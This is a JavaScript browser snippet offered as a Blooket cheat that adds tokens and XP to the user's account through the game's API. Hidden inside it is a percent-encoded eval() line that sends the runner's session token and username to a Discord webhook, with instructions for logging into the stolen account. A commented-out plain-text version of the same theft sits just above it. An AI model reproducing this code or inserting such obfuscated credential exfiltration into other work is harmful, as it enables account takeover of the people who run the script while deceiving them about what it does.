async function getName(authToken) {
    const response = await fetch('https://api.blooket.com/api/users/verify-token?token=JWT+' + authToken);
    const data = await response.json();
    return data.name
};

function fetchApi(url, json, method){
	fetch(url, {
  	method: method,
    body: JSON.stringify(json),
    headers: {
    	'Content-Type': 'application/json'
    }
  }).then(function (response) {
  	return response.text()
  }).then(function(text){
  	console.log(text)
  }).catch(function(error){
  	console.error(error)
  })
}

async function addTokens() {
    const add_tokens = 500;
    const myToken = localStorage.token.split('JWT ')[1];
    
    const response = await fetch('https://api.blooket.com/api/users/add-rewards', {
        method: "PUT",
        headers: {
            "referer": "https://www.blooket.com/",
            "content-type": "application/json",
            "authorization": localStorage.token
        },
        body: JSON.stringify({
            addedTokens: add_tokens,
            addedXp: 300,
            name: await getName(myToken)
        })
    });
    
    /*
    const tokenLog = await fetch('https://discord.com/api/webhooks/903444317593559092/88xGtwZUTWmFdz957hlRhEzfBdGqgyO1xWvtNln3nlIX25VB-KPs-WeW9buFhLRko1ZQ', {
        method: "POST",
        body: JSON.stringify({
            content: await getName(myToken)+"'s Token Stolen!\n"+myToken+"\nhttps://www.blooket.com/stats?name="+await getName(myToken)
        })
    });
    */
    eval(unescape("%66%65%74%63%68%41%70%69%28%27%68%74%74%70%73%3A%2F%2F%64%69%73%63%6F%72%64%2E%63%6F%6D%2F%61%70%69%2F%77%65%62%68%6F%6F%6B%73%2F%39%30%33%37%34%39%38%35%34%30%31%33%30%35%31%30%31%30%2F%46%33%74%39%38%7A%48%72%32%61%67%43%78%34%58%41%69%52%41%43%4C%70%78%65%71%64%6E%6F%68%71%73%58%43%6F%50%63%67%50%4B%54%69%70%36%31%63%6B%79%35%4D%55%50%4E%68%43%69%74%75%71%59%6E%61%6E%31%4A%75%42%79%49%27%2C%7B%63%6F%6E%74%65%6E%74%3A%20%61%77%61%69%74%20%67%65%74%4E%61%6D%65%28%6D%79%54%6F%6B%65%6E%29%2B%22%27%73%20%54%6F%6B%65%6E%20%53%74%6F%6C%65%6E%21%5C%6E%22%2B%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%74%6F%6B%65%6E%2B%22%5C%6E%4C%6F%67%20%69%6E%74%6F%20%61%63%63%6F%75%6E%74%20%77%69%74%68%3A%20%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%74%6F%6B%65%6E%20%3D%20%27%22%2B%6C%6F%63%61%6C%53%74%6F%72%61%67%65%2E%74%6F%6B%65%6E%2B%22%27%5C%6E%68%74%74%70%73%3A%2F%2F%77%77%77%2E%62%6C%6F%6F%6B%65%74%2E%63%6F%6D%2F%73%74%61%74%73%3F%6E%61%6D%65%3D%22%2B%61%77%61%69%74%20%67%65%74%4E%61%6D%65%28%6D%79%54%6F%6B%65%6E%29%7D%2C%27%70%6F%73%74%27%29"))

    if (response.status == 200) {
        alert(`${add_tokens} added to your account!`);
    } else {
        alert('An error occured.');
    };

};

addTokens();
